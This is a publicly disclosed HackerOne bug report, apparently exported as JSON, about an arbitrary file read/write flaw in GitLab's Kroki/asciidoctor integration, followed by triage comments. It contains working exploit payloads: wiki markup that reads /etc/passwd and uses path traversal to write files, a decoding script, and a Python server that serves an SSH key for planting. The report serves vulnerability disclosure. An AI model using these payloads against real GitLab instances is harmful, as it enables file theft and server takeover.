{"id":1098793,"global_id":"Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8xMDk4Nzkz","url":"https://hackerone.com/reports/1098793","title":"Kroki Arbitrary File Read/Write ","state":"Closed","substate":"resolved","severity_rating":"high","readable_substate":"Resolved","created_at":"2021-02-08T22:24:33.083Z","submitted_at":"2021-02-08T22:24:33.101Z","is_member_of_team?":false,"reporter":{"disabled":false,"username":"ledz1996","url":"/ledz1996","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/000/584/872/78b4b2fa1173d85b7f043e9c6fc027af5699cdfc_original.jpeg/43e4513b9104ea0d68c9c096cea374ba8440dde3e027af5465c8771e8839a67c"},"is_me?":false,"cleared":true,"hackerone_triager":false,"hacker_mediation":false},"team":{"id":264,"url":"https://hackerone.com/gitlab","handle":"gitlab","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/000/000/264/8dd359f496ba6c5b97c5126dc86924a00fd7ef26_original.png/43e4513b9104ea0d68c9c096cea374ba8440dde3e027af5465c8771e8839a67c","medium":"https://profile-photos.hackerone-user-content.com/variants/000/000/264/8dd359f496ba6c5b97c5126dc86924a00fd7ef26_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"permissions":[],"submission_state":"open","default_currency":"usd","awards_miles":false,"offers_bounties":true,"state":"public_mode","only_cleared_hackers":false,"pentest_feature_enabled?":false,"profile":{"name":"GitLab","twitter_handle":"gitlab","website":"https://about.gitlab.com","about":"A single application for the entire software development lifecycle."}},"has_bounty?":true,"in_validation?":false,"rejected_anc_report_that_can_be_sent_back_to_anc_triagers?":false,"can_view_team":true,"can_view_report":true,"is_external_bug":false,"is_published":false,"is_participant":false,"has_collaborators":false,"stage":4,"public":true,"visibility":"full","cve_ids":[],"singular_disclosure_disabled":true,"disclosed_at":"2021-05-21T19:56:02.582Z","bug_reporter_agreed_on_going_public_at":"2021-05-21T19:56:02.525Z","team_member_agreed_on_going_public_at":"2021-05-21T19:51:33.641Z","comments_closed?":false,"facebook_team?":false,"team_private?":false,"vulnerability_information":"### Summary\n\nIn short, I've found a potentially weird bug in `asciidoctor` that could lead to arbitrary file read/write in `asciidoctor-kroki` even though Gitlab have already made an attempt to disable `kroki-plantuml-include`\n\n**lib/gitlab/asciidoc.rb**\n```rb\nmodule Gitlab\n  # Parser/renderer for the AsciiDoc format that uses Asciidoctor and filters\n  # the resulting HTML through HTML pipeline filters.\n  module Asciidoc\n    MAX_INCLUDE_DEPTH = 5\n    MAX_INCLUDES = 32\n    DEFAULT_ADOC_ATTRS = {\n        'showtitle' =\u003e true,\n        'sectanchors' =\u003e true,\n        'idprefix' =\u003e 'user-content-',\n        'idseparator' =\u003e '-',\n        'env' =\u003e 'gitlab',\n        'env-gitlab' =\u003e '',\n        'source-highlighter' =\u003e 'gitlab-html-pipeline',\n        'icons' =\u003e 'font',\n        'outfilesuffix' =\u003e '.adoc',\n        'max-include-depth' =\u003e MAX_INCLUDE_DEPTH,\n        # This feature is disabled because it relies on File#read to read the file.\n        # If we want to enable this feature we will need to provide a \"GitLab compatible\" implementation.\n        # This attribute is typically used to share common config (skinparam...) across all PlantUML diagrams.\n        # The value can be a path or a URL.\n        'kroki-plantuml-include!' =\u003e '',\n        # This feature is disabled because it relies on the local file system to save diagrams retrieved from the Kroki server.\n        'kroki-fetch-diagram!' =\u003e ''\n```\n\nHowever this could easily be bypassed by using `counter`\n\nhttps://github.com/asciidoctor/asciidoctor/blob/master/lib/asciidoctor/document.rb\n```rb\n  def counter name, seed = nil\n    return @parent_document.counter name, seed if @parent_document\n    if (attr_seed = !(attr_val = @attributes[name]).nil_or_empty?) \u0026\u0026 (@counters.key? name)\n      @attributes[name] = @counters[name] = Helpers.nextval attr_val\n    elsif seed\n      @attributes[name] = @counters[name] = seed == seed.to_i.to_s ? seed.to_i : seed\n    else\n      @attributes[name] = @counters[name] = Helpers.nextval attr_seed ? attr_val : 0\n    end\n  end\n```\n\n\n### Steps to reproduce\n\n\n1. Set up Gitlab with Kroki: https://docs.gitlab.com/ee/administration/integration/kroki.html\n**Arbitrary FIle Read**\n2. Create a project, create a wiki page with `asciidoctor` format and the following as payload\n\n```asciidoctor\n[#goals]\n\n[plantuml, test=\"{counter:kroki-plantuml-include:/etc/passwd}\", format=\"png\"]\n....\nclass BlockProcessor\nclass DiagramBlock\nclass DitaaBlock\nclass PlantUmlBlock\n\nBlockProcessor \u003c|-- {counter:kroki-plantuml-include}\nDiagramBlock \u003c|-- DitaaBlock\nDiagramBlock \u003c|-- PlantUmlBlock\n....\n```\n\n3. Get the base64 part of the URL of the image when being rendered\n4. Use the following code to decode the last part of the URL to get the content of file `/etc/passwd`\n\n```rb\nrequire 'base64'\nrequire 'zlib'\n\n\ntest = \"eNpLzkksLlZwyslPzg4oyk9OLS7OL-JKBgu6ZCamFyXmguXgQiWJicgCATmJeSWhuTkQMS5UcxRsanR1FTJSM1K5kM2CCCMZhSmJYiwAy8U5sQ==\"\np Zlib::Inflate.inflate(Base64.urlsafe_decode64(test))\n```\n\nVideo:\n\n{F1188648}\n\n**Arbitrary FIle Write**\n1. Create a project, create a wiki page with `asciidoctor` format and the following as payload\n\n```asciidoctor\n[#goals]\n:imagesdir: .\n:outdir: /tmp/\n\n[plantuml]\n....\nclass BlockProcessor\nclass DiagramBlock\nclass DitaaBlock\nclass PlantUmlBlock\n\nBlockProcessor \u003c|-- hehe\nDiagramBlock \u003c|-- DitaaBlock\nDiagramBlock \u003c|-- PlantUmlBlock\n....\n```\n\n2. Note in the URL there is a base64 value, copy this value\n\n3. Set up a server with the address that is being appended as `kroki-server-url,`, I used this scriptto serve a public-key file with any URL.\n\n\n```python\n/// python3 this_script.py \u003cport\u003e\nfrom http.server import BaseHTTPRequestHandler, HTTPServer\nimport logging\n\nclass S(BaseHTTPRequestHandler):\n    def _set_response(self):\n        self.send_response(200)\n        self.send_header('Content-type', 'text/html')\n        self.end_headers()\n\n    def do_GET(self):\n        logging.info(\"GET request,\\nPath: %s\\nHeaders:\\n%s\\n\", str(self.path), str(self.headers))\n        self._set_response()\n        self.wfile.write(b\"ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDEY+UcYlP8VzOBdyMGUpbVFMsAUxPjWK7OiqARu/t3wO1mSNJ/RE5eaNLz5+6zM2WllUVrYF3cDXqNxge4srScM/v887Lz8mAupAZoPunxHrSTWFHjbCBaGm80z8QyStG+GMM/iN+mu4FtQ+ckMfOA8T/9k3clK3HomQXunJe85a6MPDsgE5MvEm4MdBUKQpEaEbstmAWtQIR5KCMHyNDa9WVKQQI+TJwAMpVa3L+Lbx4TZd04Fl5uKmCYUfPfBvj1/209s1XDN2rAK3AKJjAEbPVuLcZrl9iAse0FgA6HvUtA+g21VLba5OASXU/ZsedRmzECefMu8RVKHPzaaiC+RQU+1ihgBnQig0MdaXz8PZLOCo/673Pg9nsqjNafeU7fGTJD95BkkDL/3OfIEBq+rMbOyxrU+k8H+QWeVCbvh2LWRxdy/xciOMkkdodm2eGg45kJNjoDeKJEp0YpQ9ha+PdsqQqENAbqFqmYheAy1KJcpbG+U6Uik4hVXHxTAu0= ledz@ledzs-MacBook-Pro.local\")\n\n    def do_POST(self):\n        content_length = int(self.headers['Content-Length']) # \u003c--- Gets the size of data\n        post_data = self.rfile.read(content_length) # \u003c--- Gets the data itself\n        logging.info(\"POST request,\\nPath: %s\\nHeaders:\\n%s\\n\\nBody:\\n%s\\n\",\n                str(self.path), str(self.headers), post_data.decode('utf-8'))\n\n        self._set_response()\n        self.wfile.write(\"POST request for {}\".format(self.path).encode('utf-8'))\n\ndef run(server_class=HTTPServer, handler_class=S, port=8080):\n    logging.basicConfig(level=logging.INFO)\n    server_address = ('0.0.0.0', port)\n    httpd = server_class(server_address, handler_class)\n    logging.info('Starting httpd...\\n')\n    try:\n        httpd.serve_forever()\n    except KeyboardInterrupt:\n        pass\n    httpd.server_close()\n    logging.info('Stopping httpd...\\n')\n\nif __name__ == '__main__':\n    from sys import argv\n\n    if len(argv) == 2:\n        run(port=int(argv[1]))\n    else:\n        run()\n```\n\n4. Note the URL and edit the following script to create a SHA256 of the URL\n\n```rb\nrequire 'digest'\nrequire 'base64'\nrequire 'zlib'\n\nstring = \"http://192.168.69.1:8082/plantuml/../../../../../../tmp/test_file_write.txt/eNpLzkksLlZwyslPzg4oyk9OLS7OL-JKBgu6ZCamFyXmguXgQiWJicgCATmJeSWhuTkQMS5UcxRsanR1FTJSM1K5kM2CCCMZhSmJYiwAy8U5sQ==\"\n\np \"diag-#{Digest::SHA256.hexdigest test = string}\"\n```\n\n4. Create a project, create a wiki page with `asciidoctor` format and the following as payload for the first time, replace the `diag-**.` with the `diag-\u003coutput_previous\u003e.`, Please take note of the last `.`\n\n```\n[#goals]\n:imagesdir: diag-58f90331904a1989259d639c5677e0fff5e434e739c70f1d3bb2004723bc99b8.\n:outdir: /tmp/\n\n[plantuml, test=\"{counter:kroki-fetch-diagram:true}\",tet=\"{counter:kroki-server-url:http://192.168.69.1:8082/}\", format=\"/../../../../../../tmp/test_file_write.txt\"]\n....\nclass BlockProcessor\nclass DiagramBlock\nclass DitaaBlock\nclass PlantUmlBlock\n\nBlockProcessor \u003c|-- hehe\nDiagramBlock \u003c|-- DitaaBlock\nDiagramBlock \u003c|-- PlantUmlBlock\n....\n```\n\nSave then render\n\n5. Repeat the previous step with this payload\n\n```\n[#goals]\n:imagesdir: diag-58f90331904a1989259d639c5677e0fff5e434e739c70f1d3bb2004723bc99b8.\n:outdir: /tmp/\n\n[plantuml, test=\"{counter:kroki-fetch-diagram:true}\",tet=\"{counter:kroki-server-url:http://192.168.69.1:8082/}\", format=\"/../../../../../../tmp/test_file_write.txt\"]\n....\nclass BlockProcessor\nclass DiagramBlock\nclass DitaaBlock\nclass PlantUmlBlock\n\nBlockProcessor \u003c|-- hehe\nDiagramBlock \u003c|-- DitaaBlock\nDiagramBlock \u003c|-- PlantUmlBlock\n```\n\nSave then render again\n\n5. You are able to write to any files. You can check this by simply navigate to the file using the Gitlab box\n\nVideo:\n\n{F1188695}\n\n\n#### Results of GitLab environment info\n\n```\nSystem information\nSystem:     Ubuntu 16.04\nProxy:      no\nCurrent User:   git\nUsing RVM:  no\nRuby Version:   2.7.2p137\nGem Version:    3.1.4\nBundler Version:2.1.4\nRake Version:   13.0.1\nRedis Version:  5.0.9\nGit Version:    2.29.0\nSidekiq Version:5.2.9\nGo Version: unknown\n\nGitLab information\nVersion:    13.7.4-ee\nRevision:   368b4fb2eee\nDirectory:  /opt/gitlab/embedded/service/gitlab-rails\nDB Adapter: PostgreSQL\nDB Version: 11.9\nURL:        http://gitlab3.example.vm\nHTTP Clone URL: http://gitlab3.example.vm/some-group/some-project.git\nSSH Clone URL:  git@gitlab3.example.vm:some-group/some-project.git\nElasticsearch:  no\nGeo:        yes\nGeo node:   Primary\nUsing LDAP: no\nUsing Omniauth: yes\nOmniauth Providers:\n\nGitLab Shell\nVersion:    13.14.0\nRepository storage paths:\n- default:  /var/opt/gitlab/git-data/repositories\nGitLab Shell path:      /opt/gitlab/embedded/service/gitlab-shell\nGit:        /opt/gitlab/embedded/bin/git\n```\n\n## Impact\n\nFile read/write access, RCE","bounty_amount":"5600.0","formatted_bounty":"$5,600","weakness":{"id":26,"name":"Improper Access Control - Generic"},"original_report_id":null,"original_report_url":null,"attachments":[{"id":1188648,"file_name":"Screen_Recording_2021-02-09_at_04.27.43.mov","expiring_url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/grl4tyx92jvvgwpzzfqeqo2v3jqn?response-content-disposition=attachment%3B%20filename%3D%22Screen_Recording_2021-02-09_at_04.27.43.mov%22%3B%20filename%2A%3DUTF-8%27%27Screen_Recording_2021-02-09_at_04.27.43.mov\u0026response-content-type=video%2Fquicktime\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQVJI3TZP5%2F20211011%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20211011T132431Z\u0026X-Amz-Expires=3600\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEHQaCXVzLXdlc3QtMiJHMEUCIDDOenL7uY4or83Q1QkoD3xFl3uQkVICTxz%2FSDsIuWn2AiEA6%2FBWebe5fWUS9x04VtqSrFyJrrJX9Wzed2z5QiFgezgqgwQI7f%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FARACGgwwMTM2MTkyNzQ4NDkiDH%2Fcd6CfZMtsGgbHGSrXAymgqTqfvaCT83Vkk5pwapbWccEe%2BTtGThweNvSHf8FWkbmUnw2%2BMW8gqDcDNfGz7tEqv52qONc53GYs0r8D4W05T9cQ0uJtgIqBt4OmGkISCOluU2WykgPIXNEjqYkmh5zHooyqwoU4aWAvfbkbpMVL9O0nweFS83%2BqHqg3OXHtztd3WIO7FAtaIQ%2BDUZpyi%2B0a6zYS63Ic2i25q%2F413QAdfE21IQe9RLjfzNve6b8NLPdujPpkD5MvBg8opZAcnhH3rst0f02RrXBCwMAlbK6eiAdI%2FzxadkB6vJ9FtNU65o45iqF45d%2BYmfZJlOFMAVeS2pbeBJdGI7Fl7Z2hiMv0eHtvGwtxj3crYZJWjN69sMxNPs09KcOtApNPAFwGOGCcmDvm1areMVntxdnNYOlBWv0Aq3wyIXZsHHz8lX9tMjmv61dmZYvcByrfDvKW9exhQBN91h%2F%2BbxVbw80KEhIU5ipL2I5om6%2B6BoUggVA6Zd8rRJTc%2Fnn4LxgieuXFRKE4YsS3SCif0QZM6U80f0hPAJ0yiZeJUwXPDeGE0VCDJ5xmoacd5KWtjrjLbalrb5cz74c83ZZVOwv00icAbZKCzCMp4PLt5n7snHsnET8g6Tc7A6HNeDDY0ZCLBjqlARSrOasljqaSB8W9wmwFFWOUexc%2FyrrCODPiZEQKPd3A4ujWW2tnvxuhmbVhX2LLKdYUWL%2BqV7PXCjSBr8z9e13VbLgHltUO2EekXZyt0zUO0YHMr%2B%2B3y2ykh6QETPea4u6xBc1fOLSy9BKwigrMcXLVPZQgcLcQ07YofmFon1WVZYXr3Y0Iu6F%2Fi5W2fPKhu6dNiq1Z9eaTAlzThXI9e%2BPtktaqIg%3D%3D\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Signature=e847da4732f8700ae969320b79821383f38fa61fc407d1a61921f36b296bca24","file_size":47985546,"type":"video/quicktime"},{"id":1188695,"file_name":"Screen_Recording_2021-02-09_at_05.15.11.mov","expiring_url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/gh8p910f56ml1mff5tw8qdiisajx?response-content-disposition=attachment%3B%20filename%3D%22Screen_Recording_2021-02-09_at_05.15.11.mov%22%3B%20filename%2A%3DUTF-8%27%27Screen_Recording_2021-02-09_at_05.15.11.mov\u0026response-content-type=video%2Fquicktime\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQVJI3TZP5%2F20211011%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20211011T132431Z\u0026X-Amz-Expires=3600\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEHQaCXVzLXdlc3QtMiJHMEUCIDDOenL7uY4or83Q1QkoD3xFl3uQkVICTxz%2FSDsIuWn2AiEA6%2FBWebe5fWUS9x04VtqSrFyJrrJX9Wzed2z5QiFgezgqgwQI7f%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FARACGgwwMTM2MTkyNzQ4NDkiDH%2Fcd6CfZMtsGgbHGSrXAymgqTqfvaCT83Vkk5pwapbWccEe%2BTtGThweNvSHf8FWkbmUnw2%2BMW8gqDcDNfGz7tEqv52qONc53GYs0r8D4W05T9cQ0uJtgIqBt4OmGkISCOluU2WykgPIXNEjqYkmh5zHooyqwoU4aWAvfbkbpMVL9O0nweFS83%2BqHqg3OXHtztd3WIO7FAtaIQ%2BDUZpyi%2B0a6zYS63Ic2i25q%2F413QAdfE21IQe9RLjfzNve6b8NLPdujPpkD5MvBg8opZAcnhH3rst0f02RrXBCwMAlbK6eiAdI%2FzxadkB6vJ9FtNU65o45iqF45d%2BYmfZJlOFMAVeS2pbeBJdGI7Fl7Z2hiMv0eHtvGwtxj3crYZJWjN69sMxNPs09KcOtApNPAFwGOGCcmDvm1areMVntxdnNYOlBWv0Aq3wyIXZsHHz8lX9tMjmv61dmZYvcByrfDvKW9exhQBN91h%2F%2BbxVbw80KEhIU5ipL2I5om6%2B6BoUggVA6Zd8rRJTc%2Fnn4LxgieuXFRKE4YsS3SCif0QZM6U80f0hPAJ0yiZeJUwXPDeGE0VCDJ5xmoacd5KWtjrjLbalrb5cz74c83ZZVOwv00icAbZKCzCMp4PLt5n7snHsnET8g6Tc7A6HNeDDY0ZCLBjqlARSrOasljqaSB8W9wmwFFWOUexc%2FyrrCODPiZEQKPd3A4ujWW2tnvxuhmbVhX2LLKdYUWL%2BqV7PXCjSBr8z9e13VbLgHltUO2EekXZyt0zUO0YHMr%2B%2B3y2ykh6QETPea4u6xBc1fOLSy9BKwigrMcXLVPZQgcLcQ07YofmFon1WVZYXr3Y0Iu6F%2Fi5W2fPKhu6dNiq1Z9eaTAlzThXI9e%2BPtktaqIg%3D%3D\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Signature=51bfbf4877f6729eac1597349344467b707a0861c95806cc82cc54cea170b16f","file_size":128352293,"type":"video/quicktime"}],"allow_singular_disclosure_at":null,"vote_count":37,"voters":["yssk","battle_angel","haxor31337","x-cotang","bl4de","bombon","ali","mainteemoforfun","mattberg","0nlymohammed","and 27 more..."],"severity":{"rating":"high","author_type":"Team"},"structured_scope":{"databaseId":39022,"asset_type":"OTHER","asset_identifier":"Your Own GitLab Instance","max_severity":"critical"},"abilities":{"assignable_team_members":[],"assignable_team_member_groups":[]},"activities":[{"id":10617567,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Hi @ledz1996,\n\nThank you for submitting this report! We will investigate the issue as soon as\npossible, and should get back within a week.\n\nPlease do not submit your report or ask about its status through additional\nchannels, as this unnecessarily binds resources in the security team.\n\nBest regards,\nGitLab Security Team\n","automated_response":true,"created_at":"2021-02-08T23:19:17.947Z","updated_at":"2021-02-08T23:19:17.947Z","actor":{"username":"gitlab-securitybot","cleared":false,"url":"/gitlab-securitybot","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"gitlab","actor_is_team_member":true,"actor_is_concealed_member":true},{"id":10620732,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Hi @ledz1996,\n\nThank you for your submission. I hope you are well. Your report is currently being reviewed and the HackerOne triage team will get back to you once there is additional information to share.\n\nHave a great day! \n\nKind regards,\n@turtle_shell","automated_response":false,"created_at":"2021-02-09T09:55:38.009Z","updated_at":"2021-02-09T09:55:38.009Z","actor":{"username":"turtle_shell","cleared":false,"url":"/turtle_shell","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/UEHxCfDVKTBNymNpNGb7qwy6/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":true,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"gitlab","actor_is_team_member":true,"actor_is_concealed_member":true},{"id":10620796,"is_internal":false,"editable":false,"type":"Activities::BugNeedsMoreInfo","message":"Hello @ledz1996 and thanks for your report,\n\nI would like to understand if this bug falls or not under this out of scope policy\n\n\u003e High privilege users (maintainers, owners) using a bug to sabotage/deface their own projects\n\nI have a couple of questions for you, please bear with me as I am not familiar with the application.\n\n1. Can this bug be used by any role that are not maintainers or owners to read internal file system as you did?\n1. Isn't the vulnerability in a third party instance? You mentioned this code here https://github.com/asciidoctor/asciidoctor/blob/master/lib/asciidoctor/document.rb but I don't understand how is GitLab involved in this - can you please give some insight on that?\n\nThanks a lot for your patience,\n@turtle_shell","automated_response":false,"created_at":"2021-02-09T10:02:35.770Z","updated_at":"2021-02-09T10:02:35.770Z","actor":{"username":"turtle_shell","cleared":false,"url":"/turtle_shell","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/UEHxCfDVKTBNymNpNGb7qwy6/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":true,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"gitlab","actor_is_team_member":true,"actor_is_concealed_member":true},{"id":10620910,"is_internal":false,"editable":false,"type":"Activities::BugNew","message":"Hi @turtle_shell, Gitlab allow bug finding from your own instances of gitlab. This is a bug when Kroki Feature is being used in GItlab.\nIf Kroki is enabled in Gitlab -\u003e this could be exploited by any user in that gitlab instance. \n- Asciidoctor is being used as part of gitlab and its always, the same as Kroki, but Kroki has to be enabled as a feature in Gitlab.\n\nIt is documented here\nhttps://docs.gitlab.com/ee/administration/integration/kroki.html\n\n\u003eHigh privilege users (maintainers, owners) using a bug to sabotage/deface their own projects\n\nThis is not the case since the bug is relating to system-wide file reading and writing, it is not project-related \n\nSo you have to set up an Gitlab Instance, enabling the feature https://docs.gitlab.com/ee/administration/integration/kroki.html.\n\nLogin as any user in that instance and exploit the vulnerability.","automated_response":false,"created_at":"2021-02-09T10:17:30.171Z","updated_at":"2021-02-09T10:23:17.544Z","actor":{"username":"ledz1996","cleared":true,"url":"/ledz1996","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/584/872/78b4b2fa1173d85b7f043e9c6fc027af5699cdfc_original.jpeg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"gitlab","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":10623025,"is_internal":false,"editable":false,"type":"Activities::ReportVulnerabilityTypesUpdated","message":"","automated_response":false,"created_at":"2021-02-09T13:33:08.830Z","updated_at":"2021-02-09T13:33:08.830Z","additional_data":{"added_weaknesses":[{"id":26,"name":"Improper Access Control - Generic"}],"removed_weaknesses":[]},"actor":{"username":"gitlab_cmaxim","cleared":false,"url":"/gitlab_cmaxim","profile_picture_urls":{"medium":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/variants/vmc7q2peqzpyt965jezuwkm4ravx/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c?response-content-disposition=inline%3B%20filename%3D%22cyber.png%22%3B%20filename%2A%3DUTF-8%27%27cyber.png\u0026response-content-type=image%2Fpng\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQVJI3TZP5%2F20211011%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20211011T132431Z\u0026X-Amz-Expires=3600\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEHQaCXVzLXdlc3QtMiJHMEUCIDDOenL7uY4or83Q1QkoD3xFl3uQkVICTxz%2FSDsIuWn2AiEA6%2FBWebe5fWUS9x04VtqSrFyJrrJX9Wzed2z5QiFgezgqgwQI7f%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FARACGgwwMTM2MTkyNzQ4NDkiDH%2Fcd6CfZMtsGgbHGSrXAymgqTqfvaCT83Vkk5pwapbWccEe%2BTtGThweNvSHf8FWkbmUnw2%2BMW8gqDcDNfGz7tEqv52qONc53GYs0r8D4W05T9cQ0uJtgIqBt4OmGkISCOluU2WykgPIXNEjqYkmh5zHooyqwoU4aWAvfbkbpMVL9O0nweFS83%2BqHqg3OXHtztd3WIO7FAtaIQ%2BDUZpyi%2B0a6zYS63Ic2i25q%2F413QAdfE21IQe9RLjfzNve6b8NLPdujPpkD5MvBg8opZAcnhH3rst0f02RrXBCwMAlbK6eiAdI%2FzxadkB6vJ9FtNU65o45iqF45d%2BYmfZJlOFMAVeS2pbeBJdGI7Fl7Z2hiMv0eHtvGwtxj3crYZJWjN69sMxNPs09KcOtApNPAFwGOGCcmDvm1areMVntxdnNYOlBWv0Aq3wyIXZsHHz8lX9tMjmv61dmZYvcByrfDvKW9exhQBN91h%2F%2BbxVbw80KEhIU5ipL2I5om6%2B6BoUggVA6Zd8rRJTc%2Fnn4LxgieuXFRKE4YsS3SCif0QZM6U80f0hPAJ0yiZeJUwXPDeGE0VCDJ5xmoacd5KWtjrjLbalrb5cz74c83ZZVOwv00icAbZKCzCMp4PLt5n7snHsnET8g6Tc7A6HNeDDY0ZCLBjqlARSrOasljqaSB8W9wmwFFWOUexc%2FyrrCODPiZEQKPd3A4ujWW2tnvxuhmbVhX2LLKdYUWL%2BqV7PXCjSBr8z9e13VbLgHltUO2EekXZyt0zUO0YHMr%2B%2B3y2ykh6QETPea4u6xBc1fOLSy9BKwigrMcXLVPZQgcLcQ07YofmFon1WVZYXr3Y0Iu6F%2Fi5W2fPKhu6dNiq1Z9eaTAlzThXI9e%2BPtktaqIg%3D%3D\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Signature=890cbfbcd9cfe585df5c5b17e1928bd27ac9b38246e8ba94e77f319614c7ceeb"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"gitlab","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":10623222,"is_internal":false,"editable":false,"type":"Activities::BugTriaged","message":"Hello @ledz1996,\n\nThank you for submitting this report.\n\nWe have verified this finding and have escalated to our engineering team.  We will be tracking progress internally at https://gitlab.com/gitlab-org/gitlab/-/issues/320919.  This issue will be made public 30 days following the release of a patch.I will follow up in the following days with the severity.\n\nWe will continue to update you via HackerOne as a patch is scheduled for release.\n\nBest regards,\nCostel\nGitLab Security Team","automated_response":false,"created_at":"2021-02-09T13:48:34.892Z","updated_at":"2021-02-09T13:48:34.892Z","actor":{"username":"gitlab_cmaxim","cleared":false,"url":"/gitlab_cmaxim","profile_picture_urls":{"medium":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/variants/vmc7q2peqzpyt965jezuwkm4ravx/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c?response-content-disposition=inline%3B%20filename%3D%22cyber.png%22%3B%20filename%2A%3DUTF-8%27%27cyber.png\u0026response-content-type=image%2Fpng\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQVJI3TZP5%2F20211011%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20211011T132431Z\u0026X-Amz-Expires=3600\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEHQaCXVzLXdlc3QtMiJHMEUCIDDOenL7uY4or83Q1QkoD3xFl3uQkVICTxz%2FSDsIuWn2AiEA6%2FBWebe5fWUS9x04VtqSrFyJrrJX9Wzed2z5QiFgezgqgwQI7f%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FARACGgwwMTM2MTkyNzQ4NDkiDH%2Fcd6CfZMtsGgbHGSrXAymgqTqfvaCT83Vkk5pwapbWccEe%2BTtGThweNvSHf8FWkbmUnw2%2BMW8gqDcDNfGz7tEqv52qONc53GYs0r8D4W05T9cQ0uJtgIqBt4OmGkISCOluU2WykgPIXNEjqYkmh5zHooyqwoU4aWAvfbkbpMVL9O0nweFS83%2BqHqg3OXHtztd3WIO7FAtaIQ%2BDUZpyi%2B0a6zYS63Ic2i25q%2F413QAdfE21IQe9RLjfzNve6b8NLPdujPpkD5MvBg8opZAcnhH3rst0f02RrXBCwMAlbK6eiAdI%2FzxadkB6vJ9FtNU65o45iqF45d%2BYmfZJlOFMAVeS2pbeBJdGI7Fl7Z2hiMv0eHtvGwtxj3crYZJWjN69sMxNPs09KcOtApNPAFwGOGCcmDvm1areMVntxdnNYOlBWv0Aq3wyIXZsHHz8lX9tMjmv61dmZYvcByrfDvKW9exhQBN91h%2F%2BbxVbw80KEhIU5ipL2I5om6%2B6BoUggVA6Zd8rRJTc%2Fnn4LxgieuXFRKE4YsS3SCif0QZM6U80f0hPAJ0yiZeJUwXPDeGE0VCDJ5xmoacd5KWtjrjLbalrb5cz74c83ZZVOwv00icAbZKCzCMp4PLt5n7snHsnET8g6Tc7A6HNeDDY0ZCLBjqlARSrOasljqaSB8W9wmwFFWOUexc%2FyrrCODPiZEQKPd3A4ujWW2tnvxuhmbVhX2LLKdYUWL%2BqV7PXCjSBr8z9e13VbLgHltUO2EekXZyt0zUO0YHMr%2B%2B3y2ykh6QETPea4u6xBc1fOLSy9BKwigrMcXLVPZQgcLcQ07YofmFon1WVZYXr3Y0Iu6F%2Fi5W2fPKhu6dNiq1Z9eaTAlzThXI9e%2BPtktaqIg%3D%3D\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Signature=890cbfbcd9cfe585df5c5b17e1928bd27ac9b38246e8ba94e77f319614c7ceeb"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"gitlab","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":10633809,"is_internal":false,"editable":false,"type":"Activities::ReportSeverityUpdated","message":null,"automated_response":false,"created_at":"2021-02-10T11:37:21.527Z","updated_at":"2021-02-10T11:37:21.527Z","additional_data":{"old_severity":null,"new_severity":"High","old_severity_id":null,"new_severity_id":982153},"actor":{"username":"gitlab_cmaxim","cleared":false,"url":"/gitlab_cmaxim","profile_picture_urls":{"medium":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/variants/vmc7q2peqzpyt965jezuwkm4ravx/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c?response-content-disposition=inline%3B%20filename%3D%22cyber.png%22%3B%20filename%2A%3DUTF-8%27%27cyber